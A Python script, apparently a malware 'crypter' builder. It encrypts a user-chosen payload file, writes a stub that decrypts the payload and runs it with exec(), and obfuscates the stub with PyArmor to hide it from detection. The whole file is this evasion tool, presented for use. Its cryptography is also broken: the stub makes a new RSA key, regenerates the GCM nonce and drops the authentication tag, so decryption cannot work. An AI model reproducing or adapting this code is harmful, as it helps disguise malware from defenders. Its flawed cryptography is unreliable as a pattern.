import os
import sys
import struct
import base64
import tkinter as tk
from tkinter import filedialog, messagebox
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Function to encrypt the payload
def encrypt_payload(payload_file):
    # RSA encryption of AES key
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    aes_key = os.urandom(32)
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    # AES encryption of payload
    with open(payload_file, 'rb') as f:
        payload = f.read()
    cipher = Cipher(algorithms.AES(aes_key), modes.GCM(os.urandom(12)), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_payload = encryptor.update(payload) + encryptor.finalize()
    return encrypted_aes_key, encrypted_payload

# Function to create the executable
# Function to create the executable
def create_executable(stub, encrypted_aes_key, encrypted_payload):
    with open('combined.py', 'wb') as f:
        f.write(stub.format(encrypted_aes_key=base64.b64encode(encrypted_aes_key).decode(), 
                             encrypted_payload=base64.b64encode(encrypted_payload).decode()).encode())
    os.chmod('combined.py', 0o755)

# Function to obfuscate the executable using PyArmor
def obfuscate_executable():
    os.system('pyarmor obfuscate combined.py')

# Function to encrypt the payload and create the executable
def encrypt_payload_gui():
    root = tk.Tk()
    root.withdraw()

    # Get the payload file path from user
    file_path = filedialog.askopenfilename()
    if not file_path:
        return

    # Encrypt the payload
    encrypted_aes_key, encrypted_payload = encrypt_payload(file_path)

    # Create the executable file
    stub = '''
import os
import struct
import sys
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def decrypt_and_execute(encrypted_aes_key, encrypted_payload):
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    aes_key = private_key.decrypt(
        base64.b64decode(encrypted_aes_key),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    cipher = Cipher(algorithms.AES(aes_key), modes.GCM(os.urandom(12)), backend=default_backend())
    decryptor = cipher.decryptor()
    payload = decryptor.update(base64.b64decode(encrypted_payload)) + decryptor.finalize()
    exec(payload)

encrypted_aes_key = "{encrypted_aes_key}"
encrypted_payload = "{encrypted_payload}"
decrypt_and_execute(encrypted_aes_key, encrypted_payload)
'''
    create_executable(stub, encrypted_aes_key, encrypted_payload)

    # Obfuscate the executable
    obfuscate_executable()

    # Show success message
    tk.messagebox.showinfo('Success', 'Payload encrypted and executable created successfully!')
    
if __name__ == '__main__':
    encrypt_payload_gui()
